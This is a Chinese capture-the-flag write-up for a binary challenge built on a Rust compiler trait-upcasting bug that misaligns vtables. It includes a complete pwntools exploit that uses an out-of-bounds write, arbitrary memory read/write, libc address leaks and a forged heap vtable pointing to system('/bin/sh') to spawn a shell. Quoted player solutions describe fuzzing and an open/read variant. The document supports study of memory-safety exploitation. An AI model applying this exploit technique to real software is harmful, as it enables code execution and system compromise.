# [Binary] 完美的代码

- 命题人：lrh2000
- 发现：400 分
- 解密：300 分

## 题目描述

<p>小E为某开源软件贡献代码十年之久，终于成为了该软件的核心开发者。可是，小E并不想为爱发电，他决定向该软件中注入后门，以便盗取神秘货币发大财。</p>
<p>过去了这么多年，小E后知后觉地发现这款软件的核心代码都已经用Rust重写了，想要同往常一样在C/C++代码中假装无意插入一个内存安全漏洞的好日子一去不复返。小E意识到通过常规手段悄悄插入一个足够隐秘的后门似乎并没有那么容易。于是，他编写了一段 <strong>完美的代码</strong>，这段代码顺利通过代码评审并合入到了主干。</p>
<p>可是，小E还是顺利完成了他的邪恶计划，问题出在哪里呢？完美的代码意味着 <strong>完美的程序</strong> 吗？</p>
<p><strong>说明：</strong></p>
<ul>
<li>让程序发生段错误可以获得 Flag 1</li>
<li>拿到 shell 或执行命令 <code>cat ./flag2.txt</code> 可以获得 Flag 2</li>
</ul>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>本题的技术原理可参考 <a target="_blank" rel="noopener noreferrer" href="https://github.com/rust-lang/rust/issues/131813">https://github.com/rust-lang/rust/issues/131813</a></li>
</ul>
<p>除此之外，还有如下两个和 Flag 直接相关的提示：</p>
<ul>
<li>Flag 1：如果不想看技术原理，或许可以直接手玩一下？</li>
<li>Flag 2：调试一下 Flag 1 的崩溃，或许可以想办法做到任意内存读写？在这之后，堆上的虚表指针是不是有一些神秘作用呢？</li>
</ul>
</div>

**[【附件：下载题目源码（binary-saferustplus.zip）】](attachment/binary-saferustplus.zip)**

**【终端交互：连接到题目】**

## 预期解法

这题的出题思路是之前正常开发的时候突然蹦出来个段错误，十分疑惑，最后调试了下发现竟然是 Rust 编译器的问题。~~感觉可以用来注入后门，~~ 那不如先出道题吧。

### Flag 1：发现

怎么发现哪里有问题呢？首先题面暗示问题不在源代码里，但在编译之后的二进制文件里。预期解法：
 - 这题是个菜单题，但内部并没有维护复杂状态，其实本质不同的输入也就只有十几种或者最多几十种，手动全部尝试一遍就能发现异常了（如果输入离谱一点基本就段错误了）。懒得手动尝试也可以写个程序自动尝试，或者直接 fuzzing 。
 - 如果注意力惊人，也可以根据源代码猜一下问题在哪，比如定义了一堆 trait 并用了 `trait_upcasting` ，那么可能这块有问题概率比较大，然后去逆向二进制中对应模块。这个确实比较难，实际好像也没有选手是这么做出来的。

### Flag 2：解密

分析一下 Flag 1 中的段错误，可以看出是虚表错位，也就是调用 `put` 实际调用的是 `put_unchecked`，那么也就可以任意写入了。

正好栈上有个 `is_admin` 的布尔值，把它置为真，就可以任意读写内存，也可以泄漏 libc 里的地址。

不过这题 `main` 函数不会返回，所以不太好覆盖栈上的返回地址，但是堆上的虚表可以随便改。所以只要构造一个假的虚表，把里面的函数指针填成 `system`，就可以拿到 shell 或者执行 `cat ./flag2.txt` 了。

[利用程序：](sol/exp.py)

```py
from pwn import *

p = remote('127.0.0.1', 8080)

_created_counter = 0

def create():
    global _created_counter
    _created_counter += 1

    # Create
    p.sendlineafter(b'Enter the choice:\n', b'1')
    if _created_counter == 1:
        # Local
        p.sendlineafter(b'Enter the choice:\n', b'3')
    else:
        # Boxed
        p.sendlineafter(b'Enter the choice:\n', b'1')
    # Size
    p.sendlineafter(b'Enter the size:\n', b'1024')
    # Read/write
    p.sendlineafter(b'Enter the choice:\n', b'3')

create()
create()

def write8(off, val, sl=0):
    # Write
    p.sendlineafter(b'Enter the choice:\n', b'3')
    # Slot
    p.sendlineafter(b'Enter the slot:\n', str(sl).encode())
    # Index
    p.sendlineafter(b'Enter the index:\n', str(off if off >= 0 else off + 2**64).encode())
    # Value
    p.sendlineafter(b'Enter the value:\n', str(val).encode())
    # Unwrap
    p.sendlineafter(b'Enter the choice:\n', b'1')

def read8(off):
    # Read
    p.sendlineafter(b'Enter the choice:\n', b'2')
    # Slot
    p.sendlineafter(b'Enter the slot:\n', b'0')
    # Index
    p.sendlineafter(b'Enter the index:\n', str(off if off >= 0 else off + 2**64).encode())
    # Unchecked
    p.sendlineafter(b'Enter the choice:\n', b'3')
    # Result
    p.recvuntil(b'Result: ')
    return int(p.recvline().decode().strip())

def write64(off, val):
    for i in range(0, 8):
        write8(off + i, (val >> i * 8) & 0xff)

def read64(off):
    res = 0
    for i in reversed(range(0, 8)):
        res = (res << 8) | read8(off + i)
    return res

# is_admin: 0x98(%rsp)
# local_data: 0xa8(%rsp)

write8(-16, 1)

# (gdb) x/20a $rsp
# 0x7ffe65eecac0:	0x5aeb2a9d9810 <_ZN3run4main17hf2eb20adc216d115E>	0x724b6fe6024a <__libc_start_call_main+122>
# 0x7ffe65eecad0:	0x7ffe65eecbc0	0x5aeb2a9db520 <main>
# 0x7ffe65eecae0:	0x12a9c3040	0x7ffe65eecbd8
# 0x7ffe65eecaf0:	0x7ffe65eecbd8	0x920e9a292183a1ec
# 0x7ffe65eecb00:	0x0	0x7ffe65eecbe8
# 0x7ffe65eecb10:	0x5aeb2aa1dd28	0x724b7007b020 <_rtld_global>
# 0x7ffe65eecb20:	0x6df251f4b421a1ec	0x769845e52585a1ec
# 0x7ffe65eecb30:	0x0	0x0
# 0x7ffe65eecb40:	0x0	0x7ffe65eecbd8
# 0x7ffe65eecb50:	0x7ffe65eecbd8	0x9bae95e730d0200
#
# (gdb) disp/i $pc
# 1: x/i $pc
# => 0x5aeb2a9dbe73 <_ZN3run6traits6CanPut13put_unchecked17hee53d1baa5fbab4bE+3>:	movzbl (%rcx,%rsi,1),%eax
# (gdb) p/a $rcx
# $3 = 0x7ffe65eec528
#
# (gdb) p __libc_system
# $4 = {int (const char *)} 0x724b6fe85490 <__libc_system>

in_libc = read64(0x7ffe65eecac8 - 0x7ffe65eec528)
system = in_libc + 0x724b6fe85490 - 0x724b6fe6024a

stack = read64(0x7ffe65eecaf0 - 0x7ffe65eec528)
base = stack + 0x7ffe65eec528 - 0x7ffe65eecbd8

vec = read64(-32)
data = read64(vec - base + 32)
vptr = read64(vec - base + 40)

write64(data - base, u64(b'/bin/sh\x00'))
write64(vec - base + 40, vec + 48 - 0x38)
write64(vec - base + 48, system)

write8(0, 0, 1)

p.interactive()
```

### 优秀选手解法

 - 下面的脚本可以秒出 Flag 1，参见清华大学选手 [Vursc 的 writeup](../../players-writeup/1273) （确实是“完美的解法”）：
> 完美的解法（出结果用不了一秒钟）：
> ```
> while
>     grep -ao '[0123]' /dev/urandom | tee in | ./run >/dev/null 2>err;
>     grep -q assert err;
> do :; done
> ```
 - 其实不利用 `is_admin` 也不调用 `system` 同样能拿 Flag 2，参见清华大学选手 [tony 的 writeup](../../players-writeup/700)：
> 而利用这点修改了别的`BoxedData`的data指针后，也就能任意位置读取了。
> [ .. ]
> 总之我采取了另一个方法，利用的是调用的虚函数的返回值是会打印出来的这一点，首先执行`open64(./flag2.txt, 0)`，返回值`fd`会被打印到命令行（其实不打印的话也大概率可以猜是3）。然后再调用`read(fd, buf, ...)`，当然，第三个参数是没法控制的，因为override的虚函数只有前两个参数，只好听天由命希望这个值足够大就行。事实上，确实work了，最后读取`buf`的内容就是flag2了。
